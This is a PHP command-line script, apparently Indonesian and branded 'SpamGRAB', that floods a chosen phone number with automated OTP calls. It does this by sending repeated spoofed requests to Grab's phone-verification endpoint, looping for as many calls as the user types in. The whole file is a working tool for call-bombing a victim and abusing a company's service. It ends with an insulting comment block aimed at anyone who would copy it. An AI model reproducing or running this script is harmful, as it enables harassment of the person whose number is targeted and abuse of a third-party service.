<?php
function spam(){
	return trim(fgets(STDIN));
}
class spamcall{
	public function __construct($num){
		$this->number = $num;
	}
	private function spam(){
		return trim(fgets(STDIN));
	}
	private function correct($num){
		$cek = substr($num,0,2);
		if($cek=="08"){
			$num = "62".substr($num,1);
		}
		return $num;
	}
	private function calli(){
		$num = $this->correct($this->number);
		$isekai = rand(0123456,9999999);
		$rands = $this->randomStr(12);
		$post = "method=CALL&countryCode=id&phoneNumber=$num&templateID=pax_android_production";
		$h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands";
		$h[] = "Accept-Language: in-ID;q=1.0, en-us;q=0.9, en;q=0.8";
		$h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $isekai)";
		$h[] = "Content-Type: application/x-www-form-urlencoded";
		$h[] = "Content-Length: ".strlen($post);
		$h[] = "Host: api.grab.com";
		$h[] = "Connection: close";
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
		curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		$x = curl_exec($ch); curl_close($ch);
		$calli = json_decode($x,true);
		if(empty($calli['ISEKAI'])){
                        echo " \n";
			echo "1x Memanggil\n";
                        echo "Nomor Tersebut Akan Mendapatkan Panggilan\n";
		}else{
                        echo " \n";
			echo "Berhasil\n";
                        echo "Nomor T Akan Mendapatkan Panggilan\n";
		}
	}
	private function rest($many,$sleep=null){
		$a=0;
		$num = $this->correct($this->number);
		while($a<$many){
			$random = rand(0123456,9999999);
			$rands = $this->randomStr(12);
			$post = "method=CALL&countryCode=id&phoneNumber=$num&templateID=pax_android_production";
			$h[] = "x-request-id: ebf61bc3-8092-4924-bf45-$rands";
			$h[] = "Accept-Language: in-ID;q=1.0, en-us;q=0.9, en;q=0.8";
			$h[] = "User-Agent: Grab/5.20.0 (Android 6.0.1; Build $random)";
			$h[] = "Content-Type: application/x-www-form-urlencoded";
			$h[] = "Content-Length: ".strlen($post);
			$h[] = "Host: api.grab.com";
			$h[] = "Connection: close";
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, "https://api.grab.com/grabid/v1/phone/otp");
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
			curl_setopt($ch, CURLOPT_HTTPHEADER, $h);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			$x = curl_exec($ch); curl_close($ch);
			$calli = json_decode($x,true);
			if(empty($calli['ISEKAI'])){
				continue;
			}else{
				$nn = $a+1;
				echo "[$nn] Berhasil\r";
				$a++;
			}
			if($sleep!=null) sleep($sleep);
			if($a>=$many) echo "\nSelesai!\n";
		}
	}
	private function randomStr($l){
		$data = "abcdefghijklmnopqrstuvwxyz1234567890";
		$word = "";
		for($a=0;$a<$l;$a++){
			$word .= $data{rand(0,strlen($data)-1)};
		}
		return $word;
	}
	public function run(){
		while(true){
                        echo " \n";
			echo "Spam? (Y/N) > ";
			$rest = $this->spam();
			if($rest=="Y" OR $rest=="N"){
				break;
			}else{
				echo "Jika Anda Ingin Spam Call Jawab Y, Jika Tidak Jawab N\n";
				continue;
			}
		}
		if($rest=="Y"){
                        echo " \n";
                        echo "Berapa Banyak Panggilan?\n";
			echo "Input > ";
			$many = $this->spam();
			$this->rest($many);
		}else{
			$this->calli();
		}
	}
}
echo "→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→\n";
echo "↑ ____                         ____ ____      _    ____  ↓\n";
echo "↑/ ___| _ __   __ _ _ __ ___  / ___|  _ \    / \  | __ ) ↓\n";
echo "↑\___ \| '_ \ / _` | '_ ` _ \| |  _| |_) |  / _ \ |  _ \ ↓\n";
echo "↑ ___) | |_) | (_| | | | | | | |_| |  _ <  / ___ \| |_) |↓\n";
echo "↑|____/| .__/ \__,_|_| |_| |_|\____|_| \_\/_/   \_\____/ ↓\n";
echo "↑      |_|                                               ↓\n";
echo "→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→→\n";
echo "##################\n";
echo "# Copyright Code #\n";
echo "##################\n";
echo "# [ISEKAI] RIN   #\n";
echo "##################\n";
echo " \n";
echo "Pastikan Nomor Tersebut : [62XXXXXXXXXXX]\n";
echo "Nomor HP > ";
$num = spam();
$n = new spamcall($num);
$n->run();

##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
##//[ NGAPAIN LIAT LIAT? ]                         ##
##//[ MAU RECODE? ]                                ##
##//[ MAU BACOD? NGOMONG "Hallahhh.. Itu Rocode" ] ##
##//[ GOBLOK!! ]                                   ##
##//[ SUDAH DI BILANG INI COPYRIGHT SCRIPT ]       ##
##//[ JADI NO BACOD LAH ]                          ##
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
